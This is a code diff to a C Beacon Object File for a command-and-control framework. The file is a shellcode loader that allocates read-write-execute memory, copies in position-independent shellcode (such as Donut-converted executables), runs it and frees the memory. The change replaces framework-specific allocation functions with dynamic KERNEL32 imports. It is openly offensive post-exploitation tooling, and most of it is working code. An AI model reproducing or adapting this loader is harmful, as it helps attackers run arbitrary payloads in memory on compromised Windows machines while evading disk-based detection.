@@ -1,5 +1,5 @@
 /*
- * shellcode_loader.c - Generic PIC Shellcode Loader BOF
+ * Generic PIC Shellcode Loader BOF
  * 
  * Loads and executes position-independent shellcode passed as argument.
  * Used for executing Donut-converted PE files (.exe/.dll).
@@ -15,12 +15,11 @@
 #include <stdbool.h>
 #include <stdint.h>
 
-#include "../Beacon/include/coff/beacon.h"
+#include "../Beacon/include/coff/beacon_compatibility.h"
 
-/* Pandragon-specific BOF API (beacon_compatibility.h functions) */
-WINBASEAPI LPVOID WINAPI BeaconVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-WINBASEAPI BOOL   WINAPI BeaconVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
-WINBASEAPI DWORD  WINAPI BeaconGetLastError(VOID);
+DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(VOID);
 
 /* Internal memcpy - use msvcrt$memset pattern for compatibility */
 #define mem_copy(dst, src, len) __builtin_memcpy(dst, src, len)
@@ -69,12 +68,12 @@ void go(char* args, int len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Allocating RWX memory for %d bytes", decoded_len);
     
     // Allocate RWX memory using beacon's VirtualAlloc
-    void* mem = BeaconVirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    void* mem = KERNEL32$VirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!mem) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] VirtualAlloc failed: %d", BeaconGetLastError());
+        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] VirtualAlloc failed: %d", KERNEL32$GetLastError());
         return;
     }
-    
+
     BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Allocated at 0x%p", mem);
     
     // Copy shellcode
@@ -88,6 +87,6 @@ void go(char* args, int len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Shellcode returned");
     
     // Free memory
-    BeaconVirtualFree(mem, 0, MEM_RELEASE);
+    KERNEL32$VirtualFree(mem, 0, MEM_RELEASE);
     BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Memory freed");
 }
